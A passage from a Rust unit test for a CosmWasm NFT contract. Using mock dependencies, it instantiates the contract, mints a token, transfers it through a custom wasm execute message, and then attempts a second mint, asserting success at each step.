    let res = instantiate(&mut deps, mock_env(), info, instantiate_msg);
    assert_eq!(res.unwrap(), Response::default());

    // Execute the Mint message
    let mint_msg = ExecuteMsg::Mint { };
    let info = mock_info(&user, &[]);
    let res = execute(&mut deps, mock_env(), info, mint_msg);
    assert_eq!(res.unwrap(), Response::default());

    // Execute the TransferNft message
    let transfer_msg = Cw721ExecuteMsg::TransferNft {
        recipient: receiver,
        token_id: "0".to_string(),
    };
    let wasm_msg = WasmMsg::Execute {
        contract_addr: contract_address,
        msg: to_binary(&transfer_msg).unwrap(),
        funds: vec![],
    };
    let execute_msg = ExecuteMsg::Custom(wasm_msg);
    let info = mock_info(&user, &[]);
    let res = execute(&mut deps, mock_env(), info, execute_msg);
    assert_eq!(res.unwrap(), Response::default());

    // Attempt to mint another token
    let mint_msg = ExecuteMsg::Mint { };
    let info = mock_info(&user, &[]);
    let res = execute(&mut deps, mock_env(), info, mint_msg);
    assert_eq!(res.unwrap(), Response::default());
}
```
